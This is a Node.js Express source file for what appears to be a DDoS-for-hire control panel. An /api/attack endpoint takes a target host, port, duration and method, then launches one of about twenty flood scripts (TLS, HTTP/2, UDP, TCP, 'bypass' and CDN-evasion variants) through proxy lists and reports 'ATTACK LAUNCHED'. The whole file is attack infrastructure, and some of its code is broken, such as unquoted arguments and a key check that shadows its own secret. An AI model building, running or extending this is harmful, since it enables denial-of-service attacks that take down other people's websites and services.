const express = require('express');
const app = express();
const port = 2216;

const key = "zoxx";
app.get('/api/attack', (req, res) => {
  try {
    const key = req.query.key;  
    const host = req.query.host;
    const port = req.query.port;
    const time = parseInt(req.query.time);
    const method = req.query.method;

    if (req.query.key !== key) {
      return res.status(401).send('Key not working');
    }

    const spawn = require('child_process').spawn;

    if (method === 'tls') {
      const ls = spawn('node', ['tls.js', host, time, 16, 4, 'proxy.txt']);
      sendResponse(ls, res, host, port, time, method);
    } else if (method === 'H2-MERIS') {
      const ls = spawn('node', ['h2meris.js', 'GET', host, time, 100, 10, 'proxy.txt', 'bot=bot', '--flood', '--delaytime', 1, '--cookie', "bypassing=%RAND%", '--querystring', 1, '--botfmode', true, '--postdata', "user=f&pass=%RAND%", '--referers', 'rand', '--cdn', true]);
      sendResponse(ls, res, host, port, time, method);
    } else if (method === 'bypass-x') {
      const ls = spawn('node', ['uz.js', 'GET', host, time, 2, 4, 'proxy.txt', '--query', '1', '--delay', 1, '--cookies=key', "bypassing=%RAND%", '--bfm', 'true', '--postdata', "user=f&pass=%RAND%", '--debug', 'true', '--cdn', 'true']);
      sendResponse(ls, res, host, port, time, method);
    } else if (method === 'h2-mix') {
      const ls = spawn('node', ['h2-mix.js', host, time, 4, 2, 'proxy.txt']);
    } else if (method === 'GLORY') {
      const ls = spawn('node', ['glory.js', host, time, 100, 10, 'proxy.txt']);
      sendResponse(ls, res, host, port, time, method);
    } else if (method === 'MERIAM') {
      const ls = spawn('node', ['meriam.js', host, time, 100, 10, 'proxy.txt']);
      sendResponse(ls, res, host, port, time, method);
    } else if (method === 'bypass') {
      const ls = spawn('node', ['bypass.js', host, time, 100, 10, 'proxy.txt']);
      sendResponse(ls, res, host, port, time, method);
    } else if (method === 'HTTP-KILL') {
      const ls = spawn('node', ['HTTP-KIL.js', HEAD, host, time, 10, 7, 'proxy.txt', --randrate, --full, --legit, --query, 1]);
      sendResponse(ls, res, host, port, time, method);
    } else if (method === 'x-hit') {
      const ls = spawn('node', ['x-hit.js', host, time, 110, 10, 'proxy.txt']);
      sendResponse(ls, res, host, port, time, method);
    } else if (method === 'VIX') {
      const ls = spawn('node', ['vix.js', host, time, 110, 10, 'proxy.txt']);
      sendResponse(ls, res, host, port, time, method);
    } else if (method === 'SKY') {
      const ls = spawn('node', ['sky.js', host, time, 110, 10, 'proxy.txt']);
      sendResponse(ls, res, host, port, time, method);
    } else if (method === 'c-f') {
      const ls = spawn('node', ['c-f.js', host, time, 8, 3]);
      sendResponse(ls, res, host, port, time, method);
    } else if (method === 'TLSV2') {
      const ls = spawn('node', ['tlsv2.js', host, time, 8, 3]);
      sendResponse(ls, res, host, port, time, method);
    } else if (method === 'https') {
      const ls = spawn('node', ['https.js', host, time, 16, 4, 'proxy.txt', 'bypass']);
    } else if (method === 'browsern') {
      const ls = spawn('node', ['browsern.js', host, time, 3]);
      sendResponse(ls, res, host, port, time, method);
    } else if (method === 'DARBOST') {
      const ls = spawn('node', ['darbost.js', host, time, 100, 10, 'proxy.txt']);
      sendResponse(ls, res, host, port, time, method);
    } else if (method === 'tcp-pps') {
      const ls = spawn('./tcp-pps', [host, port, '2', time]);
      sendResponse(ls, res, host, port, time, method);
    } else if (method === 'udp') {
      const ls = spawn('./udp', [host, port, '3', time]);
      sendResponse(ls, res, host, port, time, method);
    } else if (method === 'tcp') {
      const ls = spawn('timeout', [`time`, './tcp', host, port, '3', '99999']);
     sendResponse(ls, res, host, port, time, method);
    } else if (method === 'ninja') {
      const ls = spawn('node', ['Ninja.js', host, time]);
      sendResponse(ls, res, host, port, time, method);
    } else {
      res.status(400).send('Method tidak valid');
    }
  } catch (error) {
    console.error(error);
    res.status(500).send('Terjadi kesalahan pada server');
  }
});

function sendResponse(ls, res, host, port, time, method) {
  const html = `
    <html>
      <body>
        <h1>ATTACK LAUNCHED</h1>
        <p>Host: ${host}</p>
        <p>Port: ${port}</p>
        <p>Time: ${time}</p>
        <p>Method: ${method}</p>
      </body>
    </html>
  `;
  res.send(html);

  ls.stdout.on('data', (data) => {
    console.log(`stdout: ${data}`);
  });

  ls.stderr.on('data', (data) => {
    console.error(`stderr: ${data}`);
  });

  ls.on('close', (code) => {
    console.log(`child process exited with code ${code}`);
    if (code !== 0) {
      console.error('Terjadi kesalahan selama pelaksanaan proses.');
    }
  });
}

app.listen(port, () => {
  console.log(`API Zoxx Started On Port: ${port}`);
});